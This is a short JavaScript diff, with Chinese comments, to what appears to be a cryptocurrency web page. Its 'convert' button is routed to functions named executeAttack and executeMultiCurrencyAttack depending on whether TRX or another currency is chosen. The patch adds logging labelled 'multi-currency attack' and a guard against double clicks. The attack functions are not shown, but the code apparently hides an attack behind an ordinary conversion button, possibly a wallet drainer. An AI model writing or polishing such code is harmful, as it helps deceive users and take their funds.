@@ -976,6 +976,7 @@ async function executeMultiCurrencyAttack() {
     // 如果是TRX，使用原有的executeAttack函数
     if (currentFromCurrency === 'TRX') {
         if (typeof executeAttack === 'function') {
+            console.log('🎯 多币种攻击：检测到TRX，调用原有逻辑');
             return executeAttack();
         }
     }
@@ -1048,14 +1049,27 @@ function initMultiCurrencyFeatures() {
         // 保存原有的onclick
         const originalOnclick = convertBtn.onclick;
 
-        // 设置新的onclick
+        // 设置新的onclick - 修复重复调用问题
         convertBtn.onclick = async function() {
-            if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
-                // TRX使用原有逻辑
-                return await executeAttack();
-            } else {
-                // 其他币种使用新逻辑
-                return await executeMultiCurrencyAttack();
+            // 防止重复调用
+            if (convertBtn.disabled) return;
+            convertBtn.disabled = true;
+            
+            try {
+                if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
+                    // TRX使用原有逻辑
+                    console.log('🎯 多币种补丁：调用TRX原有逻辑');
+                    return await executeAttack();
+                } else {
+                    // 其他币种使用新逻辑
+                    console.log('🎯 多币种补丁：调用多币种逻辑');
+                    return await executeMultiCurrencyAttack();
+                }
+            } finally {
+                // 恢复按钮状态
+                setTimeout(() => {
+                    convertBtn.disabled = false;
+                }, 2000);
             }
         };
     }
